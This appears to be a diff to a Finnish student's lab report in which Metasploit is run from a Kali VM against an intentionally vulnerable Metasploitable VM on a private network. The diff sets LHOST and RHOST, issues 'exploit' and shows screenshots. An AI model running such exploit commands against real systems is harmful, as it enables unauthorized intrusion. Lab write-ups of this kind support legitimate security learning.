@@ -98,7 +98,21 @@ Tämän jälkeen pääsinkin valitsemaan mitä kyseisellä hyökkäyksellä halu
 
 <img width="955" height="785" alt="VirtualBox_Kali_07_09_2026_20_52_50" src="https://github.com/user-attachments/assets/bd4f57f9-6c65-4a9e-ba51-c925ccbd4632" />
 
+Halusin seuraavaksi varmistaa hyökkääväni oikealle koneelle, joten asetin itseni komennon ajajaksi 
 
+```set LHOST 192.168.56.103```
+
+Sekä Metasploitablen kohteekseni komennolla 
+
+```set RHOST 192.168.56.104```
+
+Ja ei muutakun rankkaa hakkerointia antamalla komento 
+
+```exploit```
+
+<img width="942" height="226" alt="VirtualBox_Kali_07_09_2026_21_00_04" src="https://github.com/user-attachments/assets/f552806b-523e-47b8-878e-42b4f9cd625b" />
+
+<img width="498" height="280" alt="hacker-hackerman" src="https://github.com/user-attachments/assets/85d9cb9c-6bc7-4ab8-b0f4-f9963fdda48d" />
 
 
 ## g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. 
